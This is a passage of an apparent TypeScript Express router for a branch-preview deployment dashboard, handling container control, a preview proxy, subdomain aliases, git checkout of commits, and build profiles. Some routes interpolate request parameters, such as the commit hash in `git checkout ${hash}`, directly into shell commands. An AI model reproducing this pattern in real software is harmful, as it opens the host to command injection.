      for (const svc of Object.values(entry.services)) {
        if (svc.status === 'running' || svc.status === 'starting') {
          svc.status = 'stopping';
        }
      }
      stateService.save();

      // Actually stop containers
      for (const svc of Object.values(entry.services)) {
        try { await containerService.stop(svc.containerName); } catch { /* ok */ }
        svc.status = 'stopped';
      }
      entry.status = 'idle';
      cleanupPreviewServer(id);
      stateService.save();
      res.json({ message: '所有服务已停止' });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  // ── Set default branch ──

  router.post('/branches/:id/set-default', async (req, res) => {
    const { id } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }
    stateService.setDefaultBranch(id);
    stateService.save();
    res.json({ message: `Default branch set to "${id}"` });
  });

  // ── Preview port (port mode: per-branch proxy with path-prefix routing) ──

  router.post('/branches/:id/preview-port', async (req, res) => {
    const { id } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }
    if (entry.status !== 'running') {
      res.status(400).json({ error: '分支未运行' });
      return;
    }

    // Reuse existing preview port if still alive
    if (entry.previewPort && previewServers.has(id)) {
      res.json({ port: entry.previewPort });
      return;
    }

    // Allocate a new port
    const port = stateService.allocatePort(config.portStart);
    // P4 Part 17 (G2 fix): scope by branch project so the path-prefix
    // proxy only routes to profiles owned by this project.
    const profiles = stateService.getBuildProfilesForProject(entry.projectId || 'default');

    // Create a lightweight HTTP proxy that routes by path-prefix
    const server = http.createServer((proxyReq, proxyRes) => {
      const url = proxyReq.url || '/';

      // Detect which profile handles this path (reuse same logic as main proxy)
      const profileIds = Object.keys(entry.services);
      let targetProfileId: string | undefined;

      // Phase 1: explicit pathPrefixes
      const profilesWithRoutes = profiles
        .filter(p => p.pathPrefixes && p.pathPrefixes.length > 0 && profileIds.includes(p.id))
        .sort((a, b) => {
          const maxA = Math.max(...(a.pathPrefixes || []).map(s => s.length));
          const maxB = Math.max(...(b.pathPrefixes || []).map(s => s.length));
          return maxB - maxA;
        });
      for (const profile of profilesWithRoutes) {
        if (profile.pathPrefixes!.some(prefix => url.startsWith(prefix))) {
          targetProfileId = profile.id;
          break;
        }
      }
      // Phase 2: convention fallback
      if (!targetProfileId) {
        if (url.startsWith('/api/')) {
          targetProfileId = profileIds.find(pid => pid.includes('api') || pid.includes('backend'));
        }
        if (!targetProfileId) {
          targetProfileId = profileIds.find(pid => pid.includes('web') || pid.includes('frontend') || pid.includes('admin'))
            || profileIds[0];
        }
      }

      const svc = targetProfileId ? entry.services[targetProfileId] : undefined;
      if (!svc || svc.status !== 'running') {
        proxyRes.writeHead(502, { 'Content-Type': 'application/json' });
        proxyRes.end(JSON.stringify({ error: `Service "${targetProfileId}" not running` }));
        return;
      }

      const upstream = `http://127.0.0.1:${svc.hostPort}`;
      const upstreamUrl = new URL(upstream);
      const opts: http.RequestOptions = {
        hostname: upstreamUrl.hostname,
        port: upstreamUrl.port,
        path: proxyReq.url,
        method: proxyReq.method,
        headers: { ...proxyReq.headers, host: `${upstreamUrl.hostname}:${upstreamUrl.port}` },
      };

      const upReq = http.request(opts, (upRes) => {
        proxyRes.writeHead(upRes.statusCode || 200, upRes.headers);
        upRes.pipe(proxyRes, { end: true });
      });
      upReq.on('error', () => {
        if (!proxyRes.headersSent) {
          proxyRes.writeHead(502, { 'Content-Type': 'application/json' });
          proxyRes.end(JSON.stringify({ error: 'Upstream connection failed' }));
        }
      });
      proxyReq.pipe(upReq, { end: true });
    });

    // WebSocket upgrade support (for Vite HMR)
    server.on('upgrade', (proxyReq, socket, head) => {
      const url = proxyReq.url || '/';
      const profileIds = Object.keys(entry.services);
      let targetProfileId: string | undefined;

      // Same path-prefix detection as above
      const profilesWithRoutes2 = profiles
        .filter(p => p.pathPrefixes && p.pathPrefixes.length > 0 && profileIds.includes(p.id))
        .sort((a, b) => {
          const maxA = Math.max(...(a.pathPrefixes || []).map(s => s.length));
          const maxB = Math.max(...(b.pathPrefixes || []).map(s => s.length));
          return maxB - maxA;
        });
      for (const profile of profilesWithRoutes2) {
        if (profile.pathPrefixes!.some(prefix => url.startsWith(prefix))) {
          targetProfileId = profile.id;
          break;
        }
      }
      if (!targetProfileId) {
        targetProfileId = profileIds.find(pid => pid.includes('web') || pid.includes('frontend') || pid.includes('admin'))
          || profileIds[0];
      }

      const svc = targetProfileId ? entry.services[targetProfileId] : undefined;
      if (!svc || svc.status !== 'running') { socket.destroy(); return; }

      const upstream = `http://127.0.0.1:${svc.hostPort}`;
      const upstreamUrl = new URL(upstream);
      const opts: http.RequestOptions = {
        hostname: upstreamUrl.hostname,
        port: upstreamUrl.port,
        path: proxyReq.url,
        method: 'GET',
        headers: { ...proxyReq.headers, host: `${upstreamUrl.hostname}:${upstreamUrl.port}` },
      };

      const upReq = http.request(opts);
      upReq.on('upgrade', (upRes, upSocket, upHead) => {
        let raw = `HTTP/${upRes.httpVersion} ${upRes.statusCode} ${upRes.statusMessage}\r\n`;
        for (let i = 0; i < upRes.rawHeaders.length; i += 2) {
          raw += `${upRes.rawHeaders[i]}: ${upRes.rawHeaders[i + 1]}\r\n`;
        }
        raw += '\r\n';
        socket.write(raw);
        if (upHead.length > 0) socket.write(upHead);
        if (head.length > 0) upSocket.write(head);
        upSocket.pipe(socket);
        socket.pipe(upSocket);
      });
      upReq.on('error', () => socket.destroy());
      socket.on('error', () => upReq.destroy());
      upReq.end();
    });

    server.listen(port, '0.0.0.0', () => {
      entry.previewPort = port;
      previewServers.set(id, server);
      stateService.save();
      console.log(`[preview] Branch "${id}" preview proxy on port ${port}`);
      res.json({ port });
    });

    server.on('error', (err) => {
      console.error(`[preview] Failed to start preview proxy for "${id}":`, err);
      res.status(500).json({ error: `Preview port allocation failed: ${(err as Error).message}` });
    });
  });

  // ── Update branch metadata (favorite, notes) ──

  router.patch('/branches/:id', (req, res) => {
    const { id } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }
    try {
      const { isFavorite, notes, tags, isColorMarked } = req.body as { isFavorite?: boolean; notes?: string; tags?: string[]; isColorMarked?: boolean };
      stateService.updateBranchMeta(id, { isFavorite, notes, tags, isColorMarked });
      stateService.save();
      res.json({ message: '已更新' });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  // ── Per-branch BuildProfile overrides (inheritance-with-extension) ──
  //
  // GET returns one entry per shared BuildProfile, showing baseline + branch
  // override + merged effective. PUT replaces an override (full body), DELETE
  // clears it. Applied at runtime by `resolveEffectiveProfile` in container.ts.

  router.get('/branches/:id/profile-overrides', (req, res) => {
    const { id } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }
    // CDS infra vars (CDS_HOST / CDS_MONGODB_PORT / etc.) are injected BEFORE
    // profile.env at runtime (see container.ts runService ~L118). We expose
    // the same merge order here so the override modal's "effective env"
    // preview matches what actually reaches the container, not a misleading
    // subset that only contains user-editable keys.
    const cdsVars = stateService.getCdsEnvVars();
    const cdsEnvKeys = Object.keys(cdsVars);
    // P4 Part 17 (G2 fix): scope by branch project so the override
    // modal's "effective env" preview only enumerates profiles in
    // this project, not every project's profile.
    const profiles = stateService.getBuildProfilesForProject(entry.projectId || 'default');
    const payload = profiles.map(profile => {
      const override = entry.profileOverrides?.[profile.id];
      const resolved = resolveEffectiveProfile(profile, entry);
      // CDS infra vars first, then profile.env so user-set values can still
      // shadow infra defaults (keeps current runtime semantics — see container.ts).
      const effective = {
        ...resolved,
        env: { ...cdsVars, ...(resolved.env || {}) },
      };
      return {
        profileId: profile.id,
        profileName: profile.name,
        baseline: profile,
        override: override || null,
        effective,
        cdsEnvKeys,
        hasOverride: !!override && Object.keys(override).some(k => k !== 'updatedAt' && k !== 'notes'),
      };
    });
    res.json({ branchId: id, profiles: payload });
  });

  router.put('/branches/:id/profile-overrides/:profileId', (req, res) => {
    const { id, profileId } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }
    const profile = stateService.getBuildProfile(profileId);
    if (!profile) {
      res.status(404).json({ error: `构建配置 "${profileId}" 不存在` });
      return;
    }
    try {
      // Body is the BuildProfileOverride object. Unknown keys are silently
      // dropped by the interface shape — we only copy fields we recognize.
      const body = (req.body ?? {}) as Record<string, unknown>;

      // M6: reject nonsense port values outright, otherwise the front-end
      // can accidentally write containerPort:0 and break routing silently.
      if (typeof body.containerPort === 'number' && body.containerPort <= 0) {
        res.status(400).json({ error: 'containerPort 必须是正整数' });
        return;
      }

      // M8: `typeof [] === 'object'` is true and typeof null === 'object' too,
      // so we explicitly filter both. Otherwise `body.env = []` would cast to
      // Record<string,string> and produce garbage at deploy time.
      let envOverride: Record<string, string> | undefined;
      if (
        body.env !== null &&
        typeof body.env === 'object' &&
        !Array.isArray(body.env)
      ) {
        // M9: drop any value that isn't a string. Non-string values would
        // explode the env-file writer (container.ts writeEnvFile) and leak
        // `undefined` / numbers into Docker env.
        const cleaned: Record<string, string> = {};
        for (const [k, v] of Object.entries(body.env as Record<string, unknown>)) {
          if (typeof v === 'string') cleaned[k] = v;
        }
        envOverride = cleaned;
      }

      const override = {
        dockerImage: typeof body.dockerImage === 'string' ? body.dockerImage : undefined,
        command: typeof body.command === 'string' ? body.command : undefined,
        containerWorkDir: typeof body.containerWorkDir === 'string' ? body.containerWorkDir : undefined,
        containerPort: typeof body.containerPort === 'number' ? body.containerPort : undefined,
        env: envOverride,
        pathPrefixes: Array.isArray(body.pathPrefixes) ? body.pathPrefixes as string[] : undefined,
        resources: body.resources && typeof body.resources === 'object' && !Array.isArray(body.resources) ? body.resources as { memoryMB?: number; cpus?: number } : undefined,
        activeDeployMode: typeof body.activeDeployMode === 'string' ? body.activeDeployMode : undefined,
        startupSignal: typeof body.startupSignal === 'string' ? body.startupSignal : undefined,
        notes: typeof body.notes === 'string' ? body.notes : undefined,
      };
      stateService.setBranchProfileOverride(id, profileId, override);
      stateService.save();

      // Return the new effective profile so the UI can show the merged result
      // without a second round-trip.
      const refreshed = stateService.getBranch(id)!;
      const effective = resolveEffectiveProfile(profile, refreshed);
      res.json({
        message: '已保存分支覆盖',
        profileId,
        override: stateService.getBranchProfileOverride(id, profileId),
        effective,
        needsRedeploy: true,
      });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  // ── Per-branch subdomain aliases ──
  //
  // Stable-URL aliases that route to a branch in addition to the default
  // `<slug>.<rootDomain>` subdomain. Used for webhook receivers, demo
  // links, and front-end hardcoded API hosts.
  //
  // Validation rules (enforced here, not in state.ts):
  //   - Each alias is a valid DNS label: /^[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?$/
  //   - No duplicates within the same request
  //   - Not a reserved label (cds-internal tooling domains)
  //   - No collision with another branch's slug or aliases

  const DNS_LABEL_RE = /^[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?$/;
  const RESERVED_ALIAS_LABELS = new Set([
    'www', 'admin', 'switch', 'preview',
    'cds', 'master', 'dashboard',
  ]);

  router.get('/branches/:id/subdomain-aliases', (req, res) => {
    const { id } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }
    const aliases = stateService.getBranchSubdomainAliases(id);
    // Compute the full preview URLs so the UI can show them without
    // re-reading CDS config separately.
    const rootDomains = config.rootDomains?.length
      ? config.rootDomains
      : (config.previewDomain ? [config.previewDomain] : []);
    const primaryRoot = rootDomains[0] || 'example.com';
    const previewUrls = aliases.map(a => `http://${a}.${primaryRoot}`);
    const defaultUrl = `http://${id}.${primaryRoot}`;
    res.json({
      branchId: id,
      aliases,
      defaultUrl,
      previewUrls,
      rootDomain: primaryRoot,
    });
  });

  router.put('/branches/:id/subdomain-aliases', (req, res) => {
    const { id } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }

    const body = (req.body ?? {}) as { aliases?: unknown };
    if (!Array.isArray(body.aliases)) {
      res.status(400).json({ error: '请求体需要 { aliases: string[] } 格式' });
      return;
    }

    // Normalize: trim + lowercase, drop empties. Preserve order for UI display.
    const normalized: string[] = [];
    const seen = new Set<string>();
    for (const raw of body.aliases) {
      if (typeof raw !== 'string') continue;
      const lower = raw.trim().toLowerCase();
      if (!lower) continue;
      if (seen.has(lower)) continue; // drop duplicates within the request
      seen.add(lower);
      normalized.push(lower);
    }

    // Validate each label against DNS rules
    const invalidLabels = normalized.filter(a => !DNS_LABEL_RE.test(a) || a.length > 63);
    if (invalidLabels.length > 0) {
      res.status(400).json({
        error: `无效的子域名标签: ${invalidLabels.join(', ')}。只允许小写字母、数字、连字符，首尾必须是字母或数字，长度 1-63。`,
        invalidLabels,
      });
      return;
    }

    // Reject reserved labels
    const reservedHits = normalized.filter(a => RESERVED_ALIAS_LABELS.has(a));
    if (reservedHits.length > 0) {
      res.status(400).json({
        error: `保留字不允许作为别名: ${reservedHits.join(', ')}`,
        reservedLabels: reservedHits,
      });
      return;
    }

    // Reject aliases that equal this branch's own slug (no-op + confusing)
    const selfCollisions = normalized.filter(a => a === id.toLowerCase());
    if (selfCollisions.length > 0) {
      res.status(400).json({
        error: `别名不能等于分支自身的 slug "${id}"（默认路径已经覆盖）`,
      });
      return;
    }

    // Check collisions with other branches' slugs/aliases
    const collisions = stateService.findAliasCollisions(id, normalized);
    if (collisions.length > 0) {
      res.status(409).json({
        error: `子域名冲突: ${collisions.map(c => `"${c.alias}" 已被分支 "${c.conflictWith}" ${c.reason === 'slug' ? '的默认 slug' : '的别名'}占用`).join('; ')}`,
        collisions,
      });
      return;
    }

    try {
      stateService.setBranchSubdomainAliases(id, normalized);
      stateService.save();
      // Return the new aliases + preview URLs so the UI can update instantly
      const rootDomains = config.rootDomains?.length
        ? config.rootDomains
        : (config.previewDomain ? [config.previewDomain] : []);
      const primaryRoot = rootDomains[0] || 'example.com';
      res.json({
        message: '已保存子域名别名',
        branchId: id,
        aliases: normalized,
        previewUrls: normalized.map(a => `http://${a}.${primaryRoot}`),
        defaultUrl: `http://${id}.${primaryRoot}`,
        needsRedeploy: false, // aliases are proxy-level, no container restart needed
      });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.delete('/branches/:id/profile-overrides/:profileId', (req, res) => {
    const { id, profileId } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }
    try {
      stateService.clearBranchProfileOverride(id, profileId);
      stateService.save();
      res.json({ message: '已恢复为公共配置', profileId, needsRedeploy: true });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  // ── Container logs ──

  router.get('/branches/:id/logs', (req, res) => {
    const { id } = req.params;
    const logs = stateService.getLogs(id);
    res.json({ logs });
  });

  router.post('/branches/:id/container-logs', async (req, res) => {
    const { id } = req.params;
    const { profileId } = req.body as { profileId?: string };
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }

    const svc = profileId ? entry.services[profileId] : Object.values(entry.services)[0];
    if (!svc) {
      res.status(404).json({ error: '未找到服务' });
      return;
    }

    try {
      const running = await containerService.isRunning(svc.containerName);
      if (!running) {
        // Container may exist but stopped, or not exist at all – try docker inspect
        const inspectResult = await shell.exec(
          `docker inspect --format="{{.State.Status}}" ${svc.containerName}`,
        );
        if (inspectResult.exitCode !== 0) {
          res.json({ logs: `容器 ${svc.containerName} 不存在，可能已被清理。请重新部署。` });
          return;
        }
      }
      const logs = await containerService.getLogs(svc.containerName);
      res.json({ logs });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  // ── Container log stream (SSE) — replaces polling ──

  router.get('/branches/:id/container-logs-stream/:profileId', (req, res) => {
    const { id, profileId } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) { res.status(404).json({ error: `分支 "${id}" 不存在` }); return; }

    const svc = entry.services[profileId];
    if (!svc) { res.status(404).json({ error: '未找到服务' }); return; }

    initSSE(res);

    const ac = containerService.streamLogs(
      svc.containerName,
      (chunk) => sendSSE(res, 'log', { chunk }),
      () => { try { res.end(); } catch { /* already closed */ } },
    );

    // Client disconnect → stop docker logs -f
    req.on('close', () => ac.abort());
  });

  // ── Container env ──

  router.post('/branches/:id/container-env', async (req, res) => {
    const { id } = req.params;
    const { profileId } = req.body as { profileId?: string };
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }

    const svc = profileId ? entry.services[profileId] : Object.values(entry.services)[0];
    if (!svc) {
      res.status(404).json({ error: '未找到服务' });
      return;
    }

    try {
      const env = await containerService.getEnv(svc.containerName);
      res.json({ env });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  // ── Container exec (run command inside container) ──

  router.post('/branches/:id/container-exec', async (req, res) => {
    const { id } = req.params;
    const { profileId, command } = req.body as { profileId?: string; command?: string };
    if (!command || typeof command !== 'string' || !command.trim()) {
      res.status(400).json({ error: '请输入命令' });
      return;
    }

    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }

    const svc = profileId ? entry.services[profileId] : Object.values(entry.services)[0];
    if (!svc) {
      res.status(404).json({ error: '未找到运行中的服务' });
      return;
    }

    try {
      const result = await shell.exec(
        `docker exec ${svc.containerName} sh -c ${JSON.stringify(command)}`,
        { timeout: 30_000 },
      );
      res.json({
        exitCode: result.exitCode,
        stdout: result.stdout,
        stderr: result.stderr,
      });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  // ── Git log (historical commits) ──

  router.get('/branches/:id/git-log', async (req, res) => {
    const { id } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }
    const count = Math.min(parseInt(req.query.count as string) || 20, 50);
    try {
      const SEP = '<SEP>';
      const format = ['%h', '%s', '%an', '%ar'].join(SEP);
      const result = await shell.exec(
        `git log -${count} --format="${format}"`,
        { cwd: entry.worktreePath, timeout: 10_000 },
      );
      const commits = result.stdout
        .trim()
        .split('\n')
        .filter(Boolean)
        .map(line => {
          const [hash, subject, author, date] = line.split(SEP);
          return { hash, subject, author, date };
        });
      res.json({ commits });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  // ── Checkout specific commit (pin to historical commit) ──

  router.post('/branches/:id/checkout/:hash', async (req, res) => {
    const { id, hash } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }
    if (entry.status === 'building' || entry.status === 'starting') {
      res.status(409).json({ error: '分支正在构建/启动中，无法切换提交' });
      return;
    }

    try {
      // Validate the commit hash exists
      const verify = await shell.exec(
        `git cat-file -t ${hash}`,
        { cwd: entry.worktreePath, timeout: 5_000 },
      );
      if (verify.exitCode !== 0 || verify.stdout.trim() !== 'commit') {
        res.status(400).json({ error: `无效的提交: ${hash}` });
        return;
      }

      // Checkout the specific commit (detached HEAD)
      const result = await shell.exec(
        `git checkout ${hash}`,
        { cwd: entry.worktreePath, timeout: 10_000 },
      );
      if (result.exitCode !== 0) {
        throw new Error(combinedOutput(result));
      }

      // Get full short hash + subject for display
      const logResult = await shell.exec(
        'git log --oneline -1',
        { cwd: entry.worktreePath, timeout: 5_000 },
      );
      const [pinnedHash, ...subjectParts] = logResult.stdout.trim().split(' ');
      const pinnedSubject = subjectParts.join(' ');

      entry.pinnedCommit = pinnedHash || hash;
      stateService.save();

      res.json({
        message: `已切换到提交 ${pinnedHash}`,
        pinnedCommit: entry.pinnedCommit,
        subject: pinnedSubject,
      });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  // ── Unpin commit (restore to branch HEAD) ──

  router.post('/branches/:id/unpin', async (req, res) => {
    const { id } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }

    try {
      const result = await shell.exec(
        `git checkout ${entry.branch}`,
        { cwd: entry.worktreePath, timeout: 10_000 },
      );
      if (result.exitCode !== 0) {
        // Worktree may not have local branch, reset to origin
        const reset = await shell.exec(
          `git checkout -B ${entry.branch} origin/${entry.branch}`,
          { cwd: entry.worktreePath, timeout: 10_000 },
        );
        if (reset.exitCode !== 0) throw new Error(combinedOutput(reset));
      }

      entry.pinnedCommit = undefined;
      stateService.save();
      res.json({ message: '已恢复到分支最新提交' });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  // ── Reset branch status ──

  router.post('/branches/:id/reset', (req, res) => {
    const { id } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }
    entry.status = 'idle';
    entry.errorMessage = undefined;
    for (const svc of Object.values(entry.services)) {
      if (svc.status === 'error' || svc.status === 'building') {
        svc.status = 'idle';
        svc.errorMessage = undefined;
      }
    }
    stateService.save();
    res.json({ message: '分支状态已重置' });
  });

  // ── Routing rules CRUD ──

  router.get('/routing-rules', (req, res) => {
    // P4 Part 3b: optional ?project=<id> filter.
    const projectFilter = typeof req.query.project === 'string' ? req.query.project : null;
    const rules = projectFilter
      ? stateService.getRoutingRulesForProject(projectFilter)
      : stateService.getRoutingRules();
    res.json({ rules });
  });

  router.post('/routing-rules', (req, res) => {
    try {
      const rule = req.body as RoutingRule;
      if (!rule.id || !rule.type || !rule.match || !rule.branch) {
        res.status(400).json({ error: 'id、类型、匹配模式和目标分支为必填项' });
        return;
      }
      rule.priority = rule.priority ?? 0;
      rule.enabled = rule.enabled ?? true;
      // P4 Part 17 (G14 fix): mirror the B1 fix on POST /build-profiles
      // and POST /infra — honour the project scope so routing rules
      // created from a non-default project don't silently land in the
      // legacy default project. Source of truth: request body, with
      // ?project= query param as fallback. Validates the project exists
      // to prevent orphan routing rules.
      if (!rule.projectId) {
        const queryProject = typeof req.query.project === 'string' ? req.query.project : null;
        rule.projectId = queryProject || 'default';
      }
      if (!stateService.getProject(rule.projectId)) {
        res.status(400).json({ error: `未知项目: ${rule.projectId}` });
        return;
      }
      {
        const m = assertProjectAccess(req as any, rule.projectId);
        if (m) { res.status(m.status).json(m.body); return; }
      }
      stateService.addRoutingRule(rule);
      stateService.save();
      res.status(201).json({ rule });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.put('/routing-rules/:id', (req, res) => {
    try {
      stateService.updateRoutingRule(req.params.id, req.body);
      stateService.save();
      res.json({ message: '已更新' });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.delete('/routing-rules/:id', (req, res) => {
    try {
      stateService.removeRoutingRule(req.params.id);
      stateService.save();
      res.json({ message: '已删除' });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  // ── Build profiles CRUD ──

  router.get('/build-profiles', (req, res) => {
    // P4 Part 3b: optional ?project=<id> filter.
    const projectFilter = typeof req.query.project === 'string' ? req.query.project : null;
    const source = projectFilter
      ? stateService.getBuildProfilesForProject(projectFilter)
      : stateService.getBuildProfiles();
    const profiles = source.map(p => ({
      ...p,
      env: p.env ? maskSecrets(p.env) : p.env,
    }));
    res.json({ profiles });
  });

  router.post('/build-profiles', (req, res) => {
    try {
      const profile = req.body as BuildProfile;
      // `command` is optional — Dockerfile-based services may rely on CMD/ENTRYPOINT
      if (!profile.id || !profile.name || !profile.dockerImage) {
        res.status(400).json({ error: 'id、名称、Docker 镜像为必填项' });
        return;
      }
      if (profile.command === undefined || profile.command === null) {
        profile.command = '';
      }
      profile.workDir = profile.workDir || '.';
      profile.containerPort = profile.containerPort || 8080;
      // P4 Part 16 (B1 fix): honor project scope — projectId can come
      // from request body (preferred) or ?project= query param fallback.
      // Without this fix, every new profile silently lands in the
      // legacy 'default' project regardless of which project the user
      // is configuring, breaking multi-project isolation entirely.
      if (!profile.projectId) {
        const queryProject = typeof req.query.project === 'string' ? req.query.project : null;
        profile.projectId = queryProject || 'default';
      }
      // Validate the target project exists so we don't create orphans.
      if (!stateService.getProject(profile.projectId)) {
        res.status(400).json({ error: `未知项目: ${profile.projectId}` });
        return;
      }
      {
        const m = assertProjectAccess(req as any, profile.projectId);
        if (m) { res.status(m.status).json(m.body); return; }
      }
      stateService.addBuildProfile(profile);
      stateService.save();
      res.status(201).json({ profile });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.put('/build-profiles/:id', (req, res) => {
    try {
      stateService.updateBuildProfile(req.params.id, req.body);
      stateService.save();
      res.json({ message: '已更新' });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.delete('/build-profiles/:id', (req, res) => {
    try {
      stateService.removeBuildProfile(req.params.id);
      stateService.save();
      res.json({ message: '已删除' });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  // ── Deploy mode switching ──

  router.put('/build-profiles/:id/deploy-mode', (req, res) => {
    try {
      const { id } = req.params;
      const { mode } = req.body as { mode?: string };
      const profile = stateService.getBuildProfile(id);
      if (!profile) {
        res.status(404).json({ error: `构建配置 "${id}" 不存在` });
        return;
      }
      // Validate mode exists (or null/empty to reset to default)
      if (mode && (!profile.deployModes || !profile.deployModes[mode])) {
        const available = profile.deployModes ? Object.keys(profile.deployModes).join(', ') : '无';
        res.status(400).json({ error: `部署模式 "${mode}" 不存在，可用: ${available}` });
        return;
      }
      stateService.updateBuildProfile(id, { activeDeployMode: mode || undefined });
      stateService.save();
      const label = mode && profile.deployModes?.[mode]?.label || 'default';
      res.json({ message: `已切换为 ${label}`, mode: mode || null });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  // ── Docker images (for dropdown selection) ──

  router.get('/docker-images', async (_req, res) => {
    try {
      const result = await shell.exec(
        `docker images --format '{"repo":"{{.Repository}}","tag":"{{.Tag}}","size":"{{.Size}}","id":"{{.ID}}"}'`,
        { timeout: 10_000 },
      );
      const images = result.stdout
        .trim()
        .split('\n')
        .filter(Boolean)
        .map(line => JSON.parse(line))
        .filter((img: { repo: string; tag: string }) => img.repo !== '<none>' && img.tag !== '<none>');
      res.json({ images });
    } catch {
      // Docker not accessible — return presets only
      res.json({ images: [] });
    }
  });

  // ── Package manager detection ──

  type PackageManager = 'npm' | 'pnpm' | 'yarn';

  /**
   * Detect the package manager for a Node.js project by checking lock files.
   * Priority: pnpm-lock.yaml > yarn.lock > package-lock.json > npm (default)
   */
  function detectPackageManager(projectDir: string): PackageManager {
    if (fs.existsSync(path.join(projectDir, 'pnpm-lock.yaml'))) return 'pnpm';
    if (fs.existsSync(path.join(projectDir, 'yarn.lock'))) return 'yarn';
    if (fs.existsSync(path.join(projectDir, 'package-lock.json'))) return 'npm';
    return 'npm';
  }

  // Cache base path: /data/cds/{projectSlug}/cache — isolated per project (1 project = 1 github repo = 1 cache)
  const cacheBase = `/data/cds/${stateService.projectSlug}/cache`;

  /** Build command prefix and cache mount for a detected package manager */
  function nodeProfileCommands(pm: PackageManager) {
    switch (pm) {
      case 'pnpm':
        return {
          installPrefix: 'corepack enable && pnpm install --frozen-lockfile && ',
          runPrefix: 'corepack enable && pnpm exec ',
          cacheMounts: [{ hostPath: `${cacheBase}/pnpm`, containerPath: '/pnpm/store' }],
        };
      case 'yarn':
        return {
          installPrefix: 'corepack enable && yarn install --frozen-lockfile && ',
          runPrefix: 'corepack enable && yarn exec ',
          cacheMounts: [{ hostPath: `${cacheBase}/yarn`, containerPath: '/usr/local/share/.cache/yarn' }],
        };
      default:
        return {
          installPrefix: 'npm install && ',
          runPrefix: 'npx ',
          cacheMounts: [{ hostPath: `${cacheBase}/npm`, containerPath: '/root/.npm' }],
        };
    }
  }

  /**
   * Check if a build command uses pnpm/yarn without corepack enable prefix.
   * Returns a warning string or null if OK.
   */
  function checkCorepackPrefix(cmd: string | undefined, profileLabel: string): string | null {
    if (!cmd) return null;
    const needsCorepack = /\b(pnpm|yarn)\b/.test(cmd) && !/corepack\s+enable/.test(cmd);
    if (needsCorepack) {
      return `${profileLabel}: 命令使用了 pnpm/yarn 但缺少 "corepack enable &&" 前缀，在 node:*-slim 镜像中会失败`;
    }
    return null;
  }

  // ── Package manager detection API ──

  router.get('/detect-pm/:workDir', (_req, res) => {
    const workDir = _req.params.workDir;
    const fullPath = path.join(config.repoRoot, workDir);
    if (!fs.existsSync(fullPath)) {
      res.status(404).json({ error: `目录 "${workDir}" 不存在` });
      return;
    }
    const pm = detectPackageManager(fullPath);
    const commands = nodeProfileCommands(pm);
    res.json({ workDir, packageManager: pm, ...commands });
  });

  // ── Quickstart: seed default build profiles for this project ──

  router.post('/quickstart', (req, res) => {
    // Resolve project scope: ?project=<id> query, body.projectId, or
    // legacy 'default'. Without scoping, every project shared the
    // global build-profile list and "快速开始" on a fresh project
    // failed with 409 because the legacy project's profiles already
    // existed.
    const queryProject = typeof req.query.project === 'string' ? req.query.project : null;
    const bodyProject = (req.body && typeof req.body.projectId === 'string') ? req.body.projectId : null;
    const projectId = bodyProject || queryProject || 'default';
    if (!stateService.getProject(projectId)) {
      res.status(400).json({ error: `未知项目: ${projectId}` });
      return;
    }

    const existing = stateService.getBuildProfilesForProject(projectId);
    if (existing.length > 0) {
      res.status(409).json({ error: '构建配置已存在。请先删除现有配置或手动添加。' });
      return;
    }

    // Use the project's actual repo root so stack detection looks at
    // the right tree. Legacy projects (no per-project repoPath) fall
